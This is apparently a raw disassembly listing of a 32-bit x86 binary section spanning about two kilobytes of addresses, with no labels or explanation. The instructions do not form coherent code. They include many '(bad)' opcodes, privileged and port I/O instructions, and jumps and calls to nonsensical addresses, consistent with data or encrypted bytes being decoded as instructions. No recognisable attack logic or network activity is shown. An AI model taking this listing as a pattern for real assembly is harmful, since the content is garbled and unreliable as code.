  4093d9:	scas   eax,DWORD PTR es:[edi]
  4093da:	mov    ds:0x52296ffc,al
  4093df:	sbb    DWORD PTR [ecx-0x225214a2],eax
  4093e5:	cmp    eax,0xbc6e3d26
  4093ea:	scas   eax,DWORD PTR es:[edi]
  4093eb:	nop
  4093ec:	sbb    dh,ah
  4093ee:	cmp    ah,al
  4093f0:	xchg   DWORD PTR [eax+0x5eb78005],edi
  4093f6:	and    BYTE PTR [edi-0x51ee878a],cl
  4093fc:	jbe    0x4093f0
  4093fe:	stos   DWORD PTR es:[edi],eax
  4093ff:	xchg   BYTE PTR [esi-0x34826b5a],ch
  409405:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409406:	xor    al,0x7b
  409408:	(bad)  
  409409:	jno    0x4093b5
  40940b:	mov    edx,0x427e57ec
  409410:	and    cl,al
  409412:	stc    
  409413:	or     bh,ah
  409415:	and    BYTE PTR [ebx+0x326a45ac],ah
  40941b:	lock dec edi
  40941d:	enter  0x7b54,0xe3
  409421:	fmulp  st(5),st
  409423:	hlt    
  409424:	imul   ebx,edx,0x5ed218eb
  40942a:	mov    eax,ds:0x1b1d7177
  40942f:	popa   
  409430:	out    dx,eax
  409431:	dec    esp
  409432:	ret    
  409433:	test   DWORD PTR [ecx],ecx
  409435:	dec    esp
  409436:	test   ch,dl
  409438:	(bad)  
  409439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40943a:	sbb    eax,0xc9274fe6
  40943f:	xchg   ecx,eax
  409440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409441:	sbb    esp,0xffffff98
  409444:	add    al,0xd5
  409446:	sbb    BYTE PTR [ebp-0x76],0x1
  40944a:	ja     0x409474
  40944c:	daa    
  40944d:	sub    al,0x26
  40944f:	sub    BYTE PTR [edi+0x36],ah
  409452:	mov    dh,0x78
  409454:	imul   ecx,DWORD PTR [edx-0x12c340d2],0xeffc4e35
  40945e:	call   0x6ac7e14
  409463:	in     eax,0xc0
  409465:	sbb    ebp,DWORD PTR [ebx-0x577231c4]
  40946b:	jnp    0x40942e
  40946d:	cld    
  40946e:	jae    0x40949d
  409470:	xor    al,0xc5
  409472:	xchg   esp,eax
  409473:	xor    eax,0x98106efc
  409478:	adc    BYTE PTR [ecx],0x79
  40947b:	loop   0x409449
  40947d:	(bad)  
  40947e:	cmp    eax,0xe468265b
  409483:	fldcw  WORD PTR [eax+0x61da68cd]
  409489:	mov    ebp,0x75356bda
  40948e:	mov    esp,0xbdac5f0c
  409493:	fs stos DWORD PTR es:[edi],eax
  409495:	cmp    al,0xcd
  409497:	aaa    
  409498:	cmp    al,0xb7
  40949a:	xchg   BYTE PTR [eax],ch
  40949c:	push   edi
  40949d:	pop    es
  40949e:	into   
  40949f:	mov    fs,WORD PTR [ecx]
  4094a1:	cld    
  4094a2:	xor    BYTE PTR [edx],ch
  4094a4:	inc    ecx
  4094a5:	fdiv   QWORD PTR [edi+eiz*2]
  4094a8:	movq   mm1,QWORD PTR [edx-0x2b]
  4094ac:	jns    0x409443
  4094ae:	repz aam 0xc
  4094b1:	int    0x93
  4094b3:	stos   DWORD PTR es:[edi],eax
  4094b4:	jecxz  0x40947c
  4094b6:	fwait
  4094b7:	aad    0x99
  4094b9:	aaa    
  4094ba:	mov    edi,edx
  4094bc:	test   bl,cl
  4094be:	stc    
  4094bf:	test   al,0xa7
  4094c1:	out    0x1b,eax
  4094c3:	cmc    
  4094c4:	mov    dh,0xc8
  4094c6:	in     al,dx
  4094c7:	shl    DWORD PTR [ebp+0x71],0xe2
  4094cb:	repz inc esi
  4094cd:	call   0xa4dd2893
  4094d2:	dec    ebp
  4094d3:	jno    0x409492
  4094d5:	out    0xa3,al
  4094d7:	dec    edi
  4094d8:	jae    0x40947c
  4094da:	jge    0x4094a3
  4094dc:	add    DWORD PTR [esi+ebx*8],0xfffffffc
  4094e0:	push   es
  4094e1:	push   es
  4094e2:	dec    ecx
  4094e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094e4:	ins    BYTE PTR es:[edi],dx
  4094e5:	inc    esi
  4094e6:	loope  0x409520
  4094e8:	loop   0x40954c
  4094ea:	jb     0x40954b
  4094ec:	dec    ebp
  4094ed:	imul   esi,esp,0x463922e7
  4094f3:	scas   eax,DWORD PTR es:[edi]
  4094f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094f5:	rdpmc  
  4094f7:	and    DWORD PTR [edi-0x193399ab],esp
  4094fd:	inc    ebx
  4094fe:	(bad)  
  4094ff:	fsub   QWORD PTR [eax-0x5cccaa67]
  409505:	adc    dl,bl
  409507:	sub    ebp,edi
  409509:	aas    
  40950a:	add    edx,DWORD PTR [ebx]
  40950c:	push   esi
  40950d:	mov    bh,BYTE PTR [esi+0x383ced37]
  409513:	aam    0x22
  409515:	test   BYTE PTR [edi-0x16],bh
  409518:	mov    ecx,0x2ab12269
  40951d:	in     al,0x3e
  40951f:	std    
  409520:	cli    
  409521:	push   ecx
  409522:	test   eax,0xcaf9ad0f
  409527:	pop    ds
  409528:	lahf   
  409529:	outs   dx,BYTE PTR ds:[esi]
  40952a:	and    BYTE PTR [edx],0x92
  40952d:	pop    esp
  40952e:	or     BYTE PTR [ebp-0x1a],ah
  409531:	pop    ebx
  409532:	jle    0x40953f
  409534:	shl    DWORD PTR [eax],cl
  409536:	jg     0x409547
  409538:	mov    bl,0xd0
  40953a:	clc    
  40953b:	gs or  eax,0xd23238d4
  409541:	cli    
  409542:	cmp    eax,DWORD PTR [ecx]
  409544:	lds    edx,FWORD PTR [eax-0x36bc00a3]
  40954a:	push   eax
  40954b:	push   edi
  40954c:	aaa    
  40954d:	and    esp,DWORD PTR [ebp+0x9d9002b]
  409553:	fst    DWORD PTR [ebp+0x4b92e6f3]
  409559:	sub    BYTE PTR [eax],0xb7
  40955c:	(bad)  
  40955d:	sbb    eax,DWORD PTR [edx+eiz*4]
  409560:	repz fwait
  409562:	cmp    dh,dh
  409564:	jg     0x409569
  409566:	je     0x409537
  409568:	sti    
  409569:	imul   BYTE PTR [edx]
  40956b:	jmp    0xfc07:0x509a8275
  409572:	mov    cl,0xf1
  409574:	leave  
  409575:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409576:	cdq    
  409577:	sub    al,0xa3
  409579:	xchg   DWORD PTR [eax+ebx*1+0x5abfcd87],ecx
  409580:	xor    ah,BYTE PTR [edi+ebp*4]
  409583:	ss push eax
  409585:	pusha  
  409586:	test   eax,0xe9cdaad9
  40958b:	pop    eax
  40958c:	jmp    0x4095f4
  40958e:	std    
  40958f:	shl    BYTE PTR [edi],1
  409591:	xchg   esi,eax
  409592:	add    al,0xcc
  409594:	test   BYTE PTR [edi+0x563db0a6],bh
  40959a:	jbe    0x409549
  40959c:	push   0x9
  40959e:	ins    BYTE PTR es:[edi],dx
  40959f:	cmp    eax,0x35c6611b
  4095a4:	push   0x884793
  4095a9:	dec    ebx
  4095aa:	jecxz  0x40953b
  4095ac:	xlat   BYTE PTR ds:[ebx]
  4095ad:	inc    esi
  4095ae:	popa   
  4095af:	dec    eax
  4095b0:	out    dx,al
  4095b1:	scas   al,BYTE PTR es:[edi]
  4095b2:	mov    ss,WORD PTR [edi+edx*2+0x16]
  4095b6:	movaps xmm3,XMMWORD PTR [ebx]
  4095b9:	addr16 dec edx
  4095bb:	sbb    edx,DWORD PTR [eax-0x4d5b2e3b]
  4095c1:	mov    ebp,0x6d5512e3
  4095c6:	or     dh,BYTE PTR [ecx]
  4095c8:	shl    DWORD PTR [edi+0x41],0x39
  4095cc:	sbb    DWORD PTR [edi+ebx*2],edi
  4095cf:	fcomi  st,st(6)
  4095d1:	out    0xd0,eax
  4095d3:	push   ecx
  4095d4:	ror    DWORD PTR [ecx+0x48],1
  4095d7:	mov    BYTE PTR [edx+0x23b985e8],dl
  4095dd:	je     0x40963e
  4095df:	add    DWORD PTR [esi],ecx
  4095e1:	sub    ebp,ebx
  4095e3:	add    bl,BYTE PTR [eax+0x137c796d]
  4095e9:	adc    bh,cl
  4095eb:	ficomp WORD PTR [ecx]
  4095ed:	(bad)  
  4095ee:	ds mov al,0xfb
  4095f1:	pop    ebp
  4095f2:	pop    esi
  4095f3:	cmc    
  4095f4:	ror    ebx,1
  4095f6:	into   
  4095f7:	imul   eax,DWORD PTR [edx-0x3bc92685],0x1f0162a5
  409601:	pop    edx
  409602:	cmp    ch,BYTE PTR [eax-0x534ab6be]
  409608:	inc    edx
  409609:	out    dx,al
  40960a:	mov    edi,0x1695bed2
  40960f:	or     BYTE PTR [edi+0xc7e4c48],0x5e
  409616:	ja     0x4095db
  409618:	push   ss
  409619:	outs   dx,DWORD PTR ds:[esi]
  40961a:	xor    DWORD PTR [eax+0x5927a2aa],edx
  409620:	pop    edx
  409621:	jno    0x4095d5
  409623:	pop    ds
  409624:	jmp    0x4095ce
  409626:	outs   dx,DWORD PTR ds:[esi]
  409627:	call   0x6035638f
  40962c:	add    dh,bh
  40962e:	mov    bl,0x5b
  409630:	xor    ecx,DWORD PTR [ebp-0x4813f4d8]
  409636:	imul   eax,ebp,0x74
  409639:	jmp    0x5ab96bcc
  40963e:	outs   dx,BYTE PTR ds:[esi]
  40963f:	daa    
  409640:	and    BYTE PTR [esi-0x5ae5053d],bl
  409646:	xchg   ebp,eax
  409647:	inc    ecx
  409648:	mov    esp,0xea6d8819
  40964d:	pop    ds
  40964e:	pop    ss
  40964f:	mov    ah,0xe0
  409651:	std    
  409652:	hlt    
  409653:	sbb    al,0xed
  409655:	add    DWORD PTR [ebp-0x24ca8b52],ecx
  40965b:	aas    
  40965c:	and    bh,bh
  40965e:	mov    ch,0xcc
  409660:	call   DWORD PTR [esi-0x68]
  409663:	mov    ecx,0x6b1ecc80
  409668:	retf   0xfa4b
  40966b:	sbb    ah,BYTE PTR [eax]
  40966d:	dec    edi
  40966e:	aaa    
  40966f:	jecxz  0x409629
  409671:	pop    ebp
  409672:	ss add al,0xb0
  409675:	bound  esi,QWORD PTR ds:0x2c41dae2
  40967b:	cmp    DWORD PTR [edi+0x5d1172bb],esp
  409681:	ret    
  409682:	mov    eax,0x3598648a
  409687:	int    0x32
  409689:	pop    esi
  40968a:	in     al,0x37
  40968c:	and    DWORD PTR es:[ebp-0x30],esi
  409690:	mov    ecx,0x5d6e97d5
  409695:	dec    ebx
  409696:	mov    ds:0xf1415b18,eax
  40969b:	cmc    
  40969c:	jae    0x4096dc
  40969e:	adc    esi,DWORD PTR [edi]
  4096a0:	test   BYTE PTR [ecx+ebp*8-0x5c213151],0xf7
  4096a8:	loop   0x40964b
  4096aa:	cmp    al,0xa9
  4096ac:	ins    BYTE PTR es:[edi],dx
  4096ad:	shl    ecx,0x1e
  4096b0:	mov    ecx,DWORD PTR [ebp-0x14]
  4096b3:	jmp    0x409c3d
  4096b8:	out    0x84,eax
  4096ba:	inc    ebx
  4096bb:	mov    bl,BYTE PTR [eax]
  4096bd:	push   eax
  4096be:	sahf   
  4096bf:	pop    eax
  4096c0:	sub    DWORD PTR [ecx-0x32894dac],edx
  4096c6:	xchg   BYTE PTR [esi+0x16162dd4],ch
  4096cc:	cmp    eax,0x58161604
  4096d1:	fld    QWORD PTR [edx-0x2d64f1c9]
  4096d7:	mov    ds:0xeee4227,al
  4096dc:	sti    
  4096dd:	push   es
  4096de:	sub    al,0x8d
  4096e0:	push   ebx
  4096e1:	shr    BYTE PTR [ebx-0x5f7115d5],1
  4096e7:	into   
  4096e8:	(bad)  
  4096e9:	ins    DWORD PTR es:[edi],dx
  4096ea:	add    al,0x68
  4096ec:	inc    ebx
  4096ed:	adc    bh,dl
  4096ef:	dec    esp
  4096f0:	loopne 0x409751
  4096f2:	les    eax,FWORD PTR [ebp-0x8]
  4096f5:	push   ecx
  4096f6:	fwait
  4096f7:	push   ds
  4096f8:	add    BYTE PTR [edi],al
  4096fa:	or     al,0xc1
  4096fc:	and    ah,ch
  4096fe:	or     ebp,DWORD PTR [esi]
  409700:	in     al,dx
  409701:	mov    WORD PTR [edi-0x17],cs
  409704:	cmp    al,0xd
  409706:	and    eax,ecx
  409708:	pop    es
  409709:	cwde   
  40970a:	add    ecx,DWORD PTR [ecx-0x43d4271b]
  409710:	inc    ebp
  409711:	(bad)  
  409712:	repnz push ecx
  409714:	xor    BYTE PTR [esi-0x56],0xaa
  409718:	push   edx
  409719:	add    BYTE PTR [eiz*4+0x2b720a48],ch
  409720:	lods   al,BYTE PTR ds:[esi]
  409721:	cld    
  409722:	sbb    esp,edi
  409724:	push   ecx
  409725:	push   ebp
  409726:	bound  ebp,QWORD PTR [ebx+0x40e23537]
  40972c:	je     0x4096e0
  40972e:	cmp    DWORD PTR [esi+0x47],esi
  409731:	sbb    DWORD PTR [edx+0x29],0x2858ba63
  409738:	fs into 
  40973a:	fimul  DWORD PTR [ebp-0x7e0592da]
  409740:	data16 or al,0xe5
  409743:	fstp   DWORD PTR [ebx]
  409745:	or     al,0x4
  409747:	mov    ch,0x59
  409749:	loop   0x40971b
  40974b:	xchg   esp,eax
  40974c:	sbb    al,0x25
  40974e:	pop    ebx
  40974f:	in     eax,dx
  409750:	push   0x8149e123
  409755:	push   ss
  409756:	les    eax,FWORD PTR [ebp+0x74]
  409759:	aad    0x95
  40975b:	mov    edx,0xc62b4551
  409760:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409761:	fcom   QWORD PTR [edx]
  409763:	outs   dx,BYTE PTR ds:[esi]
  409764:	or     al,0xb4
  409766:	aam    0x9c
  409768:	adc    edx,DWORD PTR [edi]
  40976a:	pop    ebx
  40976b:	sub    DWORD PTR [ecx+0x70],ebx
  40976e:	rdmsr  
  409770:	(bad)  
  409771:	push   ss
  409772:	pop    edx
  409773:	(bad)  
  409774:	stos   DWORD PTR es:[edi],eax
  409775:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409776:	or     DWORD PTR [edi],eax
  409778:	lock ror DWORD PTR [edi+0x48497db8],1
  40977f:	push   eax
  409780:	mov    al,ds:0xa298ad7c
  409785:	xchg   ebx,eax
  409786:	mov    esi,0xb07f5384
  40978b:	dec    edi
  40978c:	in     eax,0xf8
  40978e:	cdq    
  40978f:	mov    ebp,0x9d0d4f12
  409794:	mov    ds:0xcf0577e2,al
  409799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40979a:	dec    ebx
  40979b:	ret    
  40979c:	loopne 0x409722
  40979e:	test   DWORD PTR [ebx+edi*2],esi
  4097a1:	rcl    DWORD PTR [edx+0x3c],cl
  4097a4:	push   ss
  4097a5:	xchg   al,cl
  4097a7:	stc    
  4097a8:	sub    BYTE PTR [edx+ebp*1-0x49],ah
  4097ac:	pusha  
  4097ad:	call   0x4064c1a
  4097b2:	arpl   WORD PTR [esi+ecx*2+0x7e149be3],sp
  4097b9:	fisub  WORD PTR [esi+0x6b]
  4097bc:	lods   eax,DWORD PTR ds:[esi]
  4097bd:	rcr    BYTE PTR [esi],cl
  4097bf:	adc    eax,0x72a3fe51
  4097c4:	jle    0x409805
  4097c6:	mov    esp,ebp
  4097c8:	test   eax,0x667d202f
  4097cd:	and    BYTE PTR [edi],al
  4097cf:	xlat   BYTE PTR ds:[ebx]
  4097d0:	mov    cl,0x55
  4097d2:	inc    DWORD PTR [eax-0x44]
  4097d5:	pop    ecx
  4097d6:	repz adc ebx,DWORD PTR [eax+0x60860964]
  4097dd:	mov    bh,0x6b
  4097df:	pop    ebx
  4097e1:	fdivp  st(3),st
  4097e3:	por    mm6,QWORD PTR [eax-0x7e]
  4097e7:	mov    dl,0xd1
  4097e9:	sub    eax,0x34d5adc2
  4097ee:	jb     0x4097a6
  4097f0:	shl    BYTE PTR [eax],0x9
  4097f3:	mov    al,ds:0xbe8316ac
  4097f8:	stos   BYTE PTR es:[edi],al
  4097f9:	(bad)
  4097fd:	repnz or ecx,0x33a9861c
  409804:	xchg   edi,eax
  409805:	xor    al,0x8
  409807:	push   eax
  409808:	lahf   
  409809:	xchg   DWORD PTR [edi+0x34],eax
  40980c:	cmc    
  40980d:	pop    esi
  40980e:	daa    
  40980f:	js     0x4097f4
  409811:	icebp  
  409812:	xor    ch,BYTE PTR [ecx-0x6ae69b05]
  409818:	inc    esi
  409819:	mov    gs,ebp
  40981b:	cmp    BYTE PTR [ecx-0x14c9ccf8],ch
  409821:	sub    al,al
  409823:	add    DWORD PTR [ebp-0x34],esi
  409826:	inc    ecx
  409827:	inc    edx
  409828:	add    BYTE PTR [eax+0x51],0x2f
  40982c:	jl     0x409850
  40982e:	add    ch,BYTE PTR ss:[edx+0x8]
  409832:	cld    
  409833:	xor    ch,BYTE PTR [edi+eax*4]
  409836:	dec    edi
  409837:	add    al,0xaf
  409839:	inc    edx
  40983a:	jmp    0xfada426d
  40983f:	ins    BYTE PTR es:[edi],dx
  409840:	sbb    dh,bl
  409842:	int3   
  409843:	mov    eax,0x3956eb5
  409848:	inc    edx
  409849:	sbb    al,0x36
  40984b:	cs lock mov esi,DWORD PTR es:[edx-0x35]
  409851:	lods   eax,DWORD PTR ds:[esi]
  409852:	mov    esp,0x4c41aab7
  409857:	jmp    0x409882
  409859:	push   0x2d73f168
  40985e:	ret    0xa748
  409861:	lea    esi,[esi+0x394457f4]
  409867:	xlat   BYTE PTR ds:[ebx]
  409868:	(bad)
  40986b:	arpl   ax,cx
  40986d:	inc    ebx
  40986e:	ins    DWORD PTR es:[edi],dx
  40986f:	into   
  409870:	add    al,0x87
  409872:	popf   
  409873:	adc    al,0x68
  409875:	lods   al,BYTE PTR ds:[esi]
  409876:	stos   BYTE PTR es:[edi],al
  409877:	mov    DWORD PTR [edi+0x3304041b],edi
  40987d:	xchg   esp,eax
  40987e:	jmp    0x409883
  409880:	dec    ebp
  409881:	mov    ds:0xd0d6a806,al
  409886:	rcl    eax,1
  409888:	fcmovnbe st,st(0)
  40988a:	add    DWORD PTR [esi],0x98fb6c9b
  409890:	push   ss
  409891:	inc    edx
  409892:	in     eax,0xe0
  409894:	add    eax,0x88623fda
  409899:	(bad)  
  40989a:	jbe    0x4098bf
  40989c:	mov    ss,edi
  40989e:	xor    ah,BYTE PTR [eax]
  4098a0:	(bad)  
  4098a1:	out    dx,eax
  4098a2:	adc    eax,0x4e0affcc
  4098a7:	(bad)  
  4098a8:	and    esp,ebp
  4098aa:	or     ch,BYTE PTR [ebp+0x7e01d3bf]
  4098b0:	sbb    BYTE PTR [ebx-0x6e],bl
  4098b3:	fisub  WORD PTR [edx+0x58]
  4098b6:	inc    edx
  4098b7:	lods   al,BYTE PTR ds:[esi]
  4098b8:	jg     0x40985e
  4098ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098bb:	call   0x67a73736
  4098c0:	pop    eax
  4098c1:	pusha  
  4098c2:	and    al,0x89
  4098c4:	outs   dx,DWORD PTR ds:[esi]
  4098c5:	data16 jnp 0x409864
  4098c8:	xchg   ebp,eax
  4098c9:	ss scas al,BYTE PTR es:[edi]
  4098cb:	daa    
  4098cc:	xchg   DWORD PTR [ebp-0x49a7356a],ebx
  4098d2:	aad    0xaf
  4098d4:	popa   
  4098d5:	mov    bl,0xc2
  4098d7:	jo     0x4098c5
  4098d9:	push   edx
  4098da:	mov    ecx,0xa224d44d
  4098df:	ret    0x5f8c
  4098e2:	push   ecx
  4098e3:	bound  eax,QWORD PTR [esi+0x63ee7fb]
  4098e9:	inc    eax
  4098ea:	dec    ebp
  4098eb:	mov    ds,WORD PTR [edx]
  4098ed:	bound  eax,QWORD PTR [eax-0x29]
  4098f0:	fwait
  4098f1:	mov    ecx,0xc783e4a4
  4098f6:	cli    
  4098f7:	das    
  4098f8:	jbe    0x409953
  4098fa:	mov    ebp,0xba29dcf4
  4098ff:	or     esi,DWORD PTR [eax+0x1b]
  409902:	imul   edi,DWORD PTR [edx],0xe1e21ccb
  409908:	cwde   
  409909:	das    
  40990a:	or     eax,0x1ab57973
  40990f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409910:	call   0xbc1e560c
  409915:	popf   
  409916:	popf   
  409917:	ja     0x4098bf
  409919:	push   edx
  40991a:	call   FWORD PTR [edi-0x68df1f53]
  409920:	inc    eax
  409921:	sar    BYTE PTR fs:[edx-0x3d],cl
  409925:	pusha  
  409926:	call   0xf853:0x56257a0a
  40992d:	outs   dx,DWORD PTR ds:[esi]
  40992e:	mov    eax,0x15eb08ed
  409933:	push   esp
  409934:	sahf   
  409935:	pop    esp
  409936:	mov    cl,BYTE PTR ds:0xcaaf739c
  40993c:	fist   WORD PTR [ebx-0x18]
  40993f:	xor    eax,0xc2b0cbea
  409944:	or     DWORD PTR [edi-0x1],ebx
  409947:	lahf   
  409948:	test   DWORD PTR ds:0xd2248155,edi
  40994e:	cdq    
  40994f:	stos   BYTE PTR es:[edi],al
  409950:	dec    esp
  409951:	mov    eax,ds:0xb6c0f52b
  409956:	outs   dx,BYTE PTR ds:[esi]
  409957:	and    al,0xd3
  409959:	jb     0x40993c
  40995b:	xchg   ebp,eax
  40995c:	mov    dh,0x62
  40995e:	sbb    ebx,DWORD PTR [esi]
  409960:	shr    dl,0xd0
  409963:	sti    
  409964:	push   ebp
  409965:	lds    eax,FWORD PTR [eax]
  409967:	je     0x40995e
  409969:	sub    DWORD PTR [edx],ebx
  40996b:	sub    BYTE PTR [ebx],dh
  40996d:	mov    BYTE PTR [esi+edi*1],bh
  409970:	les    esp,FWORD PTR [ebp+0x4]
  409973:	add    dh,BYTE PTR [esi-0x4563ae7f]
  409979:	jne    0x409941
  40997b:	enter  0x6baa,0xb3
  40997f:	sbb    al,0xbf
  409981:	fidiv  DWORD PTR [eax+0x33]
  409984:	leave  
  409985:	jl     0x409996
  409987:	push   esp
  409988:	push   ss
  409989:	push   ecx
  40998b:	mov    eax,ds:0x87c91c04
  409990:	pop    ebp
  409991:	mov    dh,0x16
  409993:	push   ecx
  409994:	call   0x10f1:0xa06b384b
  40999b:	push   ebx
  40999c:	adc    edi,edx
  40999e:	push   cs
  40999f:	clc    
  4099a0:	jne    0x409945
  4099a2:	or     eax,0x60031a0c
  4099a7:	test   esp,0xfda2813c
  4099ad:	mov    eax,0x9beddb4f
  4099b2:	dec    eax
  4099b3:	add    ebp,ecx
  4099b5:	repz cs mov al,0xf5
  4099b9:	mov    al,ds:0xca7c54e9
  4099be:	xchg   ecx,eax
  4099bf:	pop    esi
  4099c0:	scas   al,BYTE PTR es:[edi]
  4099c1:	push   eax
  4099c2:	mov    edx,0xcc1fa133
  4099c7:	push   ebx
  4099c8:	cmc    
  4099c9:	fdivr  QWORD PTR [eax+0x65]
  4099cc:	mov    edi,0x195253ab
  4099d1:	not    DWORD PTR [eax]
  4099d3:	dec    esp
  4099d4:	stc    
  4099d5:	ret    
  4099d6:	aas    
  4099d7:	jbe    0x4099fa
  4099d9:	push   ds
  4099da:	add    eax,0xf3beea53
  4099df:	mov    WORD PTR [edi-0x6949ca58],es
  4099e5:	xchg   edx,eax
  4099e6:	fisttp WORD PTR [ebp+0x38]
  4099e9:	xchg   BYTE PTR [esi],ch
  4099eb:	inc    edi
  4099ec:	xor    DWORD PTR [ebp-0x61e174d2],esp
  4099f2:	cmp    eax,DWORD PTR [ebp+0x4c]
  4099f5:	cmp    al,0x10
  4099f7:	jecxz  0x409997
  4099f9:	xchg   DWORD PTR gs:[ebp-0x4],eax
  4099fd:	(bad)  
  4099fe:	dec    ecx
  409a00:	(bad)  
  409a01:	and    al,0x59
  409a03:	clc    
  409a04:	or     ch,bl
  409a06:	repnz push ecx
  409a08:	pop    ss
  409a09:	sti    
  409a0a:	retf   
  409a0b:	cli    
  409a0c:	(bad)  
  409a0d:	or     BYTE PTR [ebx+0x4d779b1f],bh
  409a13:	clc    
  409a14:	(bad)  
  409a15:	pop    esi
  409a16:	rcl    ch,cl
  409a18:	and    eax,0x7cc25235
  409a1d:	push   esp
  409a1e:	pextrw ecx,mm7,0xae
  409a22:	xchg   ecx,eax
  409a23:	cwde   
  409a24:	stos   BYTE PTR es:[edi],al
  409a25:	pop    es
  409a26:	and    DWORD PTR [edx-0x21],esp
  409a29:	mov    bl,0x6a
  409a2b:	mov    bh,0xe9
  409a2d:	push   edx
  409a2e:	cmp    DWORD PTR [eax-0x7e955e0c],eax
  409a34:	scas   eax,DWORD PTR es:[edi]
  409a35:	sti    
  409a36:	out    0x84,eax
  409a38:	push   edi
  409a39:	pop    ebp
  409a3a:	ror    BYTE PTR [ebx],cl
  409a3c:	lock add al,0x26
  409a3f:	push   ss
  409a40:	xor    DWORD PTR [esi-0xb],esi
  409a43:	add    ecx,0xffffff9b
  409a46:	inc    edx
  409a47:	loop   0x409a39
  409a49:	cmp    eax,0x938b547f
  409a4e:	hlt    
  409a4f:	aad    0x25
  409a51:	ror    DWORD PTR [edx],cl
  409a53:	imul   ecx,DWORD PTR [edi],0x7c
  409a56:	es mov edx,ecx
  409a59:	sahf   
  409a5a:	fstp   st(7)
  409a5c:	aam    0x45
  409a5e:	cmp    BYTE PTR [ebx-0x49eefc42],dh
  409a64:	push   edx
  409a65:	rcr    BYTE PTR [ebx+edx*4],cl
  409a68:	jno    0x409ae8
  409a6a:	jl     0x4099f2
  409a6c:	or     ebp,DWORD PTR [eax+0x27]
  409a6f:	ins    BYTE PTR es:[edi],dx
  409a70:	mov    BYTE PTR [eax],al
  409a72:	pop    es
  409a73:	fwait
  409a74:	ss jae 0x409ada
  409a77:	push   0x7edadc6b
  409a7c:	sub    BYTE PTR [ecx+0x28],0x6f
  409a80:	mov    bh,0x27
  409a82:	cli    
  409a83:	inc    eax
  409a84:	adc    eax,0x9aad2060
  409a89:	mov    DWORD PTR [eax-0x6c35083f],eax
  409a8f:	imul   eax,DWORD PTR [edx-0x6fc5f3d0],0xe9b47b1d
  409a99:	popa   
  409a9a:	mov    ebp,0x913778a1
  409a9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409aa0:	pop    ebp
  409aa1:	ret    0xacc9
  409aa4:	fldcw  WORD PTR [eax+0x61]
  409aa7:	sub    ecx,ecx
  409aa9:	mov    ebp,0x1e0abbf2
  409aae:	mov    esp,DWORD PTR [esi+ebp*2+0x774ffc3]
  409ab5:	out    dx,al
  409ab6:	sbb    al,0xcd
  409ab8:	test   eax,0xb8dab171
  409abd:	lods   al,BYTE PTR ds:[esi]
  409abe:	lds    ebp,FWORD PTR [ebx-0x50]
  409ac1:	dec    eax
  409ac2:	jl     0x409a49
  409ac4:	out    dx,al
  409ac5:	jl     0x409a53
  409ac7:	mov    ah,0x33
  409ac9:	sbb    eax,0x6f390536
  409ace:	mov    DWORD PTR ds:0x5af835f2,esp
  409ad4:	cmp    bl,bh
  409ad6:	fisttp WORD PTR [edx]
  409ad8:	mov    dl,0x14
  409ada:	and    eax,0x359a7fc9
  409adf:	push   edi
  409ae0:	add    dl,BYTE PTR [esi-0x42]
  409ae3:	mov    dh,0xda
  409ae5:	dec    edi
  409ae6:	(bad)  
  409ae7:	cmc    
  409ae8:	inc    ecx
  409ae9:	mov    edi,0x41d129d2
  409aee:	in     al,dx
  409aef:	push   ebx
  409af0:	(bad)  
  409af1:	cmp    al,0xc2
  409af3:	cmp    edx,DWORD PTR [edx-0x17]
  409af6:	sar    dl,cl
  409af8:	and    al,0xf8
  409afa:	test   BYTE PTR [ebx+eiz*8-0x2f],0x9a
  409aff:	inc    edx
  409b00:	in     eax,0x0
  409b02:	jae    0x409af0
  409b04:	inc    eax
  409b05:	xchg   esp,eax
  409b06:	add    cl,BYTE PTR gs:[ebx+ebx*1]
  409b0a:	test   esp,ebx
  409b0c:	retf   
  409b0d:	cmp    ecx,ebx
  409b0f:	imul   DWORD PTR [ecx+ebp*8-0x79]
  409b13:	test   BYTE PTR [eax-0x20f84439],ch
  409b19:	xchg   ebp,eax
  409b1a:	pop    edx
  409b1b:	xchg   esp,eax
  409b1c:	retf   
  409b1d:	nop
  409b1e:	bound  eax,QWORD PTR [eax]
  409b20:	cwde   
  409b21:	mov    esp,0x2938c248
  409b26:	sar    BYTE PTR [ebx-0x40d54dc0],cl
  409b2c:	mov    ch,0x59
  409b2e:	out    0x15,eax
  409b30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b31:	aas    
  409b32:	inc    esp
  409b33:	mov    al,BYTE PTR [ebp+eiz*4+0x47]
  409b37:	mov    edi,0x63802a3
  409b3c:	sub    al,0xa3
  409b3e:	int    0x45
  409b40:	test   al,bh
  409b42:	cmp    BYTE PTR [edi+0x20],cl
  409b45:	retf   
  409b46:	sbb    esp,DWORD PTR [ebx-0x4d]
  409b49:	xor    ecx,DWORD PTR [ebx]
  409b4b:	dec    edx
  409b4c:	ret    0xf5a5
  409b4f:	cli    
  409b50:	cmp    al,BYTE PTR [ebx-0x2c06ffdd]
  409b56:	mov    dh,0x95
  409b58:	sub    al,0x0
  409b5a:	dec    ebx
  409b5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b5c:	cmp    DWORD PTR [esi+0x69],eax
  409b5f:	fcom   st(0)
  409b61:	loopne 0x409bb0
  409b63:	mov    esi,0xbbb7e4ea
  409b68:	es (bad) 
  409b6a:	daa    
  409b6b:	sub    ah,bh
  409b6d:	outs   dx,DWORD PTR ds:[esi]
  409b6e:	in     al,0xfa
  409b70:	inc    eax
  409b71:	sets   BYTE PTR [eax-0x690ce7c3]
  409b78:	fidivr WORD PTR [ebp-0x58]
  409b7b:	jecxz  0x409b88
  409b7d:	inc    ecx
  409b7e:	mov    bh,0xd3
  409b80:	ficom  WORD PTR [esi-0x7e]
  409b83:	mov    cs,WORD PTR [esi]
  409b85:	dec    ecx
  409b86:	dec    eax
  409b87:	dec    esp
  409b88:	das    
